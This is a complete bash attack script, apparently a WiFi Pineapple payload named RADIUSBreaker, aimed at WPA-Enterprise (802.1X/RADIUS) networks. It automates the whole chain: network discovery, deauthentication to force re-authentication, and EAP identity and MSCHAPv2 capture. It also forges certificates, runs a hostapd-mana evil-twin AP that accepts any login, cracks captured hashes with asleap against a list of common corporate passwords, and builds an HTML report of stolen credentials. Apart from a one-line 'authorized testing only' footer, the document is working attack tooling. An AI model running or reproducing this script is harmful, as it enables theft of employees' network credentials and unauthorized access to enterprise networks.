#!/bin/bash
###############################################################################
# RADIUSBreaker — 802.1X/RADIUS Authentication Attack Framework
# NullSec Suite | WiFi Pineapple Mark VII / Nano / Tetra
#
# Attacks WPA-Enterprise networks by impersonating a RADIUS server,
# capturing EAP identities, downgrading authentication methods, and
# performing offline dictionary attacks against captured credentials.
# Supports EAP-PEAP, EAP-TTLS, EAP-TLS, EAP-FAST, and EAP-SIM.
#
# Author : bad-antics (NullSec)
# Version: 1.0.0
# License: MIT
###############################################################################

# ── NullSec Framework ──────────────────────────────────────────────────────
PAYLOAD_DIR="/root/payloads/RADIUSBreaker"
LOOT_DIR="/mmc/nullsec/radiusbreaker"
LOG_FILE="$LOOT_DIR/radiusbreaker.log"
REPORT_FILE="$LOOT_DIR/radius_report.html"
CRED_FILE="$LOOT_DIR/credentials.txt"
HANDSHAKE_DIR="$LOOT_DIR/handshakes"
CERT_DIR="$LOOT_DIR/certs"
IFACE_MON=""
IFACE_SRC=""

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
CYN='\033[0;36m'; MAG='\033[0;35m'; RST='\033[0m'

log()  { echo -e "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_FILE"; }
ok()   { log "${GRN}[✓]${RST} $*"; }
warn() { log "${YEL}[!]${RST} $*"; }
fail() { log "${RED}[✗]${RST} $*"; }
info() { log "${CYN}[i]${RST} $*"; }

banner() {
    echo -e "${MAG}"
    cat << 'EOF'
  ____      _    ____ ___ _   _ ____  ____                 _
 |  _ \    / \  |  _ \_ _| | | / ___|| __ ) _ __ ___  __ _| | _____ _ __
 | |_) |  / _ \ | | | | || | | \___ \|  _ \| '__/ _ \/ _` | |/ / _ \ '__|
 |  _ <  / ___ \| |_| | || |_| |___) | |_) | | |  __/ (_| |   <  __/ |
 |_| \_\/_/   \_\____/___|\___/|____/|____/|_|  \___|\__,_|_|\_\___|_|
                    NullSec Enterprise Attacker
EOF
    echo -e "${RST}"
}

# ── Pre-flight ─────────────────────────────────────────────────────────────
preflight() {
    mkdir -p "$LOOT_DIR" "$HANDSHAKE_DIR" "$CERT_DIR"
    > "$LOG_FILE"
    > "$CRED_FILE"

    local deps=("hostapd-mana" "asleap" "openssl" "airmon-ng" "tshark")
    local missing=()
    for d in "${deps[@]}"; do
        command -v "$d" &>/dev/null || missing+=("$d")
    done

    if [ ${#missing[@]} -gt 0 ]; then
        warn "Missing tools: ${missing[*]}"
        info "Attempting install..."
        opkg update &>/dev/null
        for pkg in "${missing[@]}"; do
            opkg install "$pkg" 2>/dev/null
        done
    fi

    # Find wireless interface
    IFACE_SRC=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
    if [ -z "$IFACE_SRC" ]; then
        fail "No wireless interface found"
        exit 1
    fi
    ok "Using interface: $IFACE_SRC"
}

# ── Certificate generation ────────────────────────────────────────────────
generate_rogue_certs() {
    info "Generating rogue CA and server certificates..."

    # Create CA
    openssl req -new -x509 -days 365 -nodes \
        -keyout "$CERT_DIR/ca.key" \
        -out "$CERT_DIR/ca.pem" \
        -subj "/C=US/ST=California/O=Legitimate Corp/CN=Enterprise CA" \
        2>/dev/null

    # Create server key and CSR
    openssl req -new -nodes \
        -keyout "$CERT_DIR/server.key" \
        -out "$CERT_DIR/server.csr" \
        -subj "/C=US/ST=California/O=Legitimate Corp/CN=radius.internal" \
        2>/dev/null

    # Sign server cert with our CA
    openssl x509 -req -days 365 \
        -in "$CERT_DIR/server.csr" \
        -CA "$CERT_DIR/ca.pem" \
        -CAkey "$CERT_DIR/ca.key" \
        -CAcreateserial \
        -out "$CERT_DIR/server.pem" \
        2>/dev/null

    # Create DH params (small for speed)
    openssl dhparam -out "$CERT_DIR/dh.pem" 1024 2>/dev/null

    ok "Rogue certificates generated"
}

# ── Enterprise network discovery ──────────────────────────────────────────
scan_enterprise_networks() {
    info "Scanning for WPA-Enterprise networks..."

    # Enable monitor mode
    airmon-ng start "$IFACE_SRC" &>/dev/null
    IFACE_MON="${IFACE_SRC}mon"
    [ ! -d "/sys/class/net/$IFACE_MON" ] && IFACE_MON="$IFACE_SRC"

    local scan_file="$LOOT_DIR/enterprise_scan.csv"

    # Quick scan for enterprise networks (look for RSN with 802.1X AKM)
    timeout 30 airodump-ng "$IFACE_MON" --wps --output-format csv -w "$LOOT_DIR/scan" 2>/dev/null &
    local scan_pid=$!
    sleep 25
    kill "$scan_pid" 2>/dev/null
    wait "$scan_pid" 2>/dev/null

    # Parse for enterprise networks (MGT = 802.1X)
    local enterprise_file="$LOOT_DIR/enterprise_networks.txt"
    > "$enterprise_file"

    if [ -f "$LOOT_DIR/scan-01.csv" ]; then
        grep "MGT" "$LOOT_DIR/scan-01.csv" 2>/dev/null | while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lanip idlen essid rest; do
            essid=$(echo "$essid" | xargs)
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            auth=$(echo "$auth" | xargs)
            [ -z "$essid" ] && continue
            echo "$bssid|$essid|$channel|$auth" >> "$enterprise_file"
            ok "Enterprise network: $essid (BSSID: $bssid, CH: $channel, Auth: $auth)"
        done
    fi

    local count
    count=$(wc -l < "$enterprise_file" 2>/dev/null || echo 0)
    info "Found $count WPA-Enterprise networks"

    # Stop monitor mode
    airmon-ng stop "$IFACE_MON" &>/dev/null 2>&1
}

# ── EAP identity capture ──────────────────────────────────────────────────
capture_eap_identities() {
    local target_bssid="$1" target_essid="$2" target_channel="$3"
    info "Capturing EAP identities for: $target_essid"

    # Monitor on target channel
    airmon-ng start "$IFACE_SRC" "$target_channel" &>/dev/null
    IFACE_MON="${IFACE_SRC}mon"
    [ ! -d "/sys/class/net/$IFACE_MON" ] && IFACE_MON="$IFACE_SRC"

    local pcap_file="$HANDSHAKE_DIR/${target_essid}_eap.pcap"

    # Capture EAP packets
    timeout 60 tshark -i "$IFACE_MON" -f "ether proto 0x888e" \
        -w "$pcap_file" -a duration:60 2>/dev/null &
    local cap_pid=$!

    # Deauth to force re-authentication
    sleep 5
    aireplay-ng --deauth 3 -a "$target_bssid" "$IFACE_MON" &>/dev/null

    wait "$cap_pid" 2>/dev/null

    # Extract identities
    if [ -f "$pcap_file" ]; then
        local identities
        identities=$(tshark -r "$pcap_file" -Y "eap.identity" -T fields -e eap.identity 2>/dev/null | sort -u)
        if [ -n "$identities" ]; then
            while IFS= read -r identity; do
                ok "Captured EAP identity: $identity"
                echo "IDENTITY|$target_essid|$identity|$(date -u '+%Y-%m-%dT%H:%M:%SZ')" >> "$CRED_FILE"
            done <<< "$identities"
        fi

        # Extract challenge/response pairs for cracking
        local mschapv2
        mschapv2=$(tshark -r "$pcap_file" -Y "eap.type == 26" -T fields \
            -e eap.identity -e mschapv2.response -e mschapv2.peer_challenge \
            -e mschapv2.auth_challenge 2>/dev/null)
        if [ -n "$mschapv2" ]; then
            warn "MSCHAPv2 challenge/response captured!"
            echo "$mschapv2" > "$HANDSHAKE_DIR/${target_essid}_mschapv2.txt"
        fi
    fi

    airmon-ng stop "$IFACE_MON" &>/dev/null 2>&1
}

# ── Rogue RADIUS AP ───────────────────────────────────────────────────────
launch_rogue_radius() {
    local target_essid="$1" target_channel="$2"
    info "Launching rogue RADIUS AP: $target_essid"

    # Generate certificates if needed
    [ ! -f "$CERT_DIR/server.pem" ] && generate_rogue_certs

    # Create hostapd-mana configuration for EAP credential capture
    local hostapd_conf="$LOOT_DIR/hostapd-mana.conf"
    cat > "$hostapd_conf" << HEOF
interface=$IFACE_SRC
ssid=$target_essid
channel=$target_channel
hw_mode=g
ieee80211n=1

# WPA-Enterprise
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP

# EAP server
ieee8021x=1
eapol_version=2
eap_server=1
eap_user_file=$LOOT_DIR/eap_users.conf

# Certificates
ca_cert=$CERT_DIR/ca.pem
server_cert=$CERT_DIR/server.pem
private_key=$CERT_DIR/server.key
dh_file=$CERT_DIR/dh.pem

# MANA EAP credential capture
mana_wpe=1
mana_credout=$LOOT_DIR/mana_creds.txt
mana_eaptypes=21,25,26
HEOF

    # EAP user file (accept any credentials)
    cat > "$LOOT_DIR/eap_users.conf" << 'UEOF'
# Accept all users for credential capture
*  PEAP,TTLS,TLS,FAST,MD5
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2 "t" [2]
UEOF

    # Launch rogue AP
    hostapd-mana "$hostapd_conf" 2>&1 | tee "$LOOT_DIR/hostapd_output.log" &
    local ap_pid=$!
    echo "$ap_pid" > "$LOOT_DIR/hostapd.pid"

    ok "Rogue RADIUS AP running (PID: $ap_pid)"
    info "Waiting for clients to connect and authenticate..."

    # Monitor for captured credentials
    local runtime=0
    local max_runtime=300  # 5 minutes
    while [ "$runtime" -lt "$max_runtime" ] && kill -0 "$ap_pid" 2>/dev/null; do
        if [ -f "$LOOT_DIR/mana_creds.txt" ] && [ -s "$LOOT_DIR/mana_creds.txt" ]; then
            local new_creds
            new_creds=$(wc -l < "$LOOT_DIR/mana_creds.txt")
            warn "🔓 Captured $new_creds credential set(s)!"
            cat "$LOOT_DIR/mana_creds.txt" >> "$CRED_FILE"
        fi
        sleep 10
        ((runtime += 10))
    done

    # Cleanup
    kill "$ap_pid" 2>/dev/null
    wait "$ap_pid" 2>/dev/null
    ok "Rogue RADIUS AP stopped"
}

# ── Credential cracking with asleap ──────────────────────────────────────
crack_credentials() {
    info "Attempting to crack captured MSCHAPv2 hashes..."

    local wordlist="/root/wordlists/rockyou.txt"
    [ ! -f "$wordlist" ] && wordlist="/usr/share/wordlists/rockyou.txt"
    [ ! -f "$wordlist" ] && wordlist="/tmp/wordlist.txt"

    if [ ! -f "$wordlist" ]; then
        warn "No wordlist found. Generating basic one..."
        wordlist="$LOOT_DIR/wordlist.txt"
        # Common enterprise passwords
        cat > "$wordlist" << 'WL'
password
Password1
Password123
Welcome1
Welcome123
Changeme1
Summer2024
Winter2024
Company123
P@ssw0rd
P@ssword1
Qwerty123
Admin123
Corporate1
Enterprise1
WL
    fi

    # Process MANA captured creds
    if [ -f "$LOOT_DIR/mana_creds.txt" ]; then
        while IFS= read -r line; do
            local username challenge response
            username=$(echo "$line" | awk -F'|' '{print $1}')
            challenge=$(echo "$line" | awk -F'|' '{print $2}')
            response=$(echo "$line" | awk -F'|' '{print $3}')

            if [ -n "$challenge" ] && [ -n "$response" ]; then
                info "Cracking: $username"
                local result
                result=$(asleap -C "$challenge" -R "$response" -W "$wordlist" 2>/dev/null)
                if echo "$result" | grep -q "password:"; then
                    local cracked_pass
                    cracked_pass=$(echo "$result" | grep "password:" | awk '{print $2}')
                    warn "🔓 CRACKED: $username : $cracked_pass"
                    echo "CRACKED|$username|$cracked_pass|$(date -u '+%Y-%m-%dT%H:%M:%SZ')" >> "$CRED_FILE"
                fi
            fi
        done < "$LOOT_DIR/mana_creds.txt"
    fi

    # Process raw MSCHAPv2 handshakes
    for f in "$HANDSHAKE_DIR"/*_mschapv2.txt; do
        [ -f "$f" ] || continue
        info "Processing $(basename "$f")..."
        asleap -r "$f" -W "$wordlist" 2>/dev/null | grep -i "password" >> "$CRED_FILE"
    done
}

# ── EAP downgrade analysis ────────────────────────────────────────────────
analyze_eap_security() {
    local target_essid="$1"
    info "Analyzing EAP security posture for: $target_essid"

    local analysis_file="$LOOT_DIR/${target_essid}_analysis.txt"
    > "$analysis_file"

    echo "=== EAP Security Analysis: $target_essid ===" >> "$analysis_file"
    echo "Timestamp: $(date -u '+%Y-%m-%dT%H:%M:%SZ')" >> "$analysis_file"
    echo "" >> "$analysis_file"

    # Check if PEAP is used (vulnerable to credential capture)
    local pcap_file="$HANDSHAKE_DIR/${target_essid}_eap.pcap"
    if [ -f "$pcap_file" ]; then
        local eap_types
        eap_types=$(tshark -r "$pcap_file" -Y "eap" -T fields -e eap.type 2>/dev/null | sort -u)

        for etype in $eap_types; do
            case "$etype" in
                13) echo "[HIGH RISK] EAP-TLS detected — certificate theft possible if CA is weak" >> "$analysis_file" ;;
                21) echo "[CRITICAL]  EAP-TTLS detected — inner auth may be plaintext (PAP)" >> "$analysis_file" ;;
                25) echo "[HIGH RISK] EAP-PEAP detected — MSCHAPv2 inner auth is crackable" >> "$analysis_file" ;;
                26) echo "[CRITICAL]  MSCHAPv2 detected — offline dictionary attack possible" >> "$analysis_file" ;;
                43) echo "[MEDIUM]    EAP-FAST detected — PAC provisioning may be vulnerable" >> "$analysis_file" ;;
                *)  echo "[INFO]      EAP type $etype detected" >> "$analysis_file" ;;
            esac
        done

        # Check certificate validation
        local cert_warns
        cert_warns=$(tshark -r "$pcap_file" -Y "ssl.alert" 2>/dev/null | wc -l)
        if [ "$cert_warns" -eq 0 ]; then
            echo "[CRITICAL] No certificate validation alerts — clients may accept rogue certs" >> "$analysis_file"
        fi
    fi

    cat "$analysis_file"
}

# ── HTML report ────────────────────────────────────────────────────────────
generate_report() {
    info "Generating RADIUS attack report..."

    local total_networks cred_count cracked_count identity_count
    total_networks=$(wc -l < "$LOOT_DIR/enterprise_networks.txt" 2>/dev/null || echo 0)
    cred_count=$(wc -l < "$CRED_FILE" 2>/dev/null || echo 0)
    cracked_count=$(grep -c "^CRACKED" "$CRED_FILE" 2>/dev/null || echo 0)
    identity_count=$(grep -c "^IDENTITY" "$CRED_FILE" 2>/dev/null || echo 0)

    cat > "$REPORT_FILE" << HTMLEOF
<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>RADIUSBreaker Report — NullSec</title>
<style>
:root{--bg:#0a0e17;--card:#111827;--accent:#a855f7;--red:#ff4757;--grn:#00ff88;--txt:#e0e0e0}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,sans-serif;padding:24px}
h1{color:var(--accent);font-size:28px;margin-bottom:4px}
.sub{color:#888;margin-bottom:24px}
.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:32px}
.card{background:var(--card);border-radius:12px;padding:20px;text-align:center;border:1px solid #222}
.card .n{font-size:36px;font-weight:700;color:var(--accent)}
.card .l{font-size:13px;color:#888;margin-top:4px}
.danger .n{color:var(--red)}
.success .n{color:var(--grn)}
h2{color:var(--accent);margin:24px 0 12px}
table{width:100%;border-collapse:collapse;background:var(--card);border-radius:12px;overflow:hidden;margin-bottom:24px}
th{background:#1a2332;color:var(--accent);padding:14px 16px;text-align:left;font-size:13px;text-transform:uppercase}
td{padding:12px 16px;border-bottom:1px solid #1a1a2e;font-size:14px}
.cracked{color:var(--red);font-weight:bold}
.footer{margin-top:32px;text-align:center;color:#555;font-size:12px}
</style></head><body>
<h1>🔐 RADIUSBreaker Report</h1>
<p class="sub">Generated $(date -u '+%Y-%m-%d %H:%M UTC') — NullSec Enterprise Attacker</p>

<div class="grid">
<div class="card"><div class="n">$total_networks</div><div class="l">Enterprise Networks</div></div>
<div class="card"><div class="n">$identity_count</div><div class="l">EAP Identities</div></div>
<div class="card danger"><div class="n">$cred_count</div><div class="l">Credentials Captured</div></div>
<div class="card success"><div class="n">$cracked_count</div><div class="l">Passwords Cracked</div></div>
</div>

<h2>Captured Credentials</h2>
<table><thead><tr><th>Type</th><th>Network</th><th>Username</th><th>Password/Hash</th><th>Timestamp</th></tr></thead><tbody>
HTMLEOF

    while IFS='|' read -r type network user pass ts; do
        local cls=""
        [ "$type" == "CRACKED" ] && cls="cracked"
        echo "<tr><td>$type</td><td>$network</td><td>$user</td><td class=\"$cls\">$pass</td><td>$ts</td></tr>" >> "$REPORT_FILE"
    done < "$CRED_FILE" 2>/dev/null

    cat >> "$REPORT_FILE" << 'HTMLEOF'
</tbody></table>
<div class="footer">RADIUSBreaker v1.0.0 — NullSec Suite — For authorized testing only</div>
</body></html>
HTMLEOF

    ok "Report saved: $REPORT_FILE"
}

LED() {
    case "$1" in
        SCANNING) LED_CMD CUSTOM 128 0 255 SOLID ;;
        ATTACK)   LED_CMD CUSTOM 255 0 0 VERYFAST ;;
        SUCCESS)  LED_CMD CUSTOM 0 255 0 FLASH ;;
        DONE)     LED_CMD CUSTOM 0 255 136 SOLID ;;
        FAIL)     LED_CMD CUSTOM 255 0 0 SOLID ;;
    esac
}
LED_CMD() { command -v LED &>/dev/null && LED "$@" 2>/dev/null; true; }

# ── Interactive menu ───────────────────────────────────────────────────────
show_menu() {
    while true; do
        echo ""
        echo -e "${MAG}╔═══════════════════════════════════════════╗${RST}"
        echo -e "${MAG}║      RADIUSBreaker — NullSec              ║${RST}"
        echo -e "${MAG}╠═══════════════════════════════════════════╣${RST}"
        echo -e "${MAG}║${RST} [1] Scan for Enterprise Networks           ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [2] Capture EAP Identities                 ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [3] Launch Rogue RADIUS AP                 ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [4] Crack Captured Credentials             ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [5] Analyze EAP Security                   ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [6] Full Attack Chain (Auto)               ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [7] Generate Report                        ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [0] Exit                                   ${MAG}║${RST}"
        echo -e "${MAG}╚═══════════════════════════════════════════╝${RST}"
        echo ""
        read -rp "Select> " choice

        case "$choice" in
            1)  scan_enterprise_networks ;;
            2)
                read -rp "Target BSSID: " tbssid
                read -rp "Target ESSID: " tessid
                read -rp "Target Channel: " tch
                capture_eap_identities "$tbssid" "$tessid" "$tch"
                ;;
            3)
                read -rp "ESSID to impersonate: " tessid
                read -rp "Channel: " tch
                launch_rogue_radius "$tessid" "$tch"
                ;;
            4)  crack_credentials ;;
            5)
                read -rp "ESSID: " tessid
                analyze_eap_security "$tessid"
                ;;
            6)  full_attack ;;
            7)  generate_report ;;
            0)  ok "Exiting RADIUSBreaker"; exit 0 ;;
            *)  warn "Invalid selection" ;;
        esac
    done
}

full_attack() {
    info "Starting full enterprise attack chain..."
    LED SCANNING
    scan_enterprise_networks

    if [ ! -s "$LOOT_DIR/enterprise_networks.txt" ]; then
        fail "No enterprise networks found"
        return
    fi

    # Attack first enterprise network found
    local first
    first=$(head -1 "$LOOT_DIR/enterprise_networks.txt")
    local bssid essid channel
    IFS='|' read -r bssid essid channel _ <<< "$first"

    LED ATTACK
    capture_eap_identities "$bssid" "$essid" "$channel"
    generate_rogue_certs
    launch_rogue_radius "$essid" "$channel"
    crack_credentials
    analyze_eap_security "$essid"
    generate_report
    LED DONE
    ok "Full attack chain complete"
}

# ── Main ───────────────────────────────────────────────────────────────────
main() {
    banner
    preflight

    case "$1" in
        --auto)  full_attack ;;
        --scan)  scan_enterprise_networks ;;
        --crack) crack_credentials ;;
        *)       show_menu ;;
    esac
}

main "$@"
